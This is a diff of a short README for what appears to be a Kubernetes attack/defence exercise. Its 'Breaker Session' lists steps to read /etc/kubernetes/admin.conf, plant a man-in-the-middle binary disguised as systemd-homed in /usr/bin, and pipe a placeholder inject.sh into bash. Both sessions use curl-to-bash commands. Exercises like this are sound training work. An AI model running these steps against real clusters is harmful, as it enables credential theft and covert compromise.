@@ -6,7 +6,9 @@
 * [Pläne/Scripte für die Verteidigung unseres](./owncluster)
 
 # Fixer Session
-1. Run [bootstrap.sh](./owncluster/bootstrap.sh)
+1. Run [bootstrap.sh](./owncluster/bootstrap.sh)  
+  `curl <link> | bash`
+
 
 # Breaker Session
 1. `cat /etc/kubernetes/admin.conf`
@@ -14,6 +16,7 @@
 2. `scp enemycluster/ideas/api-mitm/systemd-homed ubuntu@xxxx`
 3. `cp /home/ubuntu/systemd-homed /usr/bin/systemd-homed`
 4. `chmod +x /usr/bin/systemd-homed`
+5. `curl <inject.sh> | bash`
 
 ## Setup Demo Cluster
 
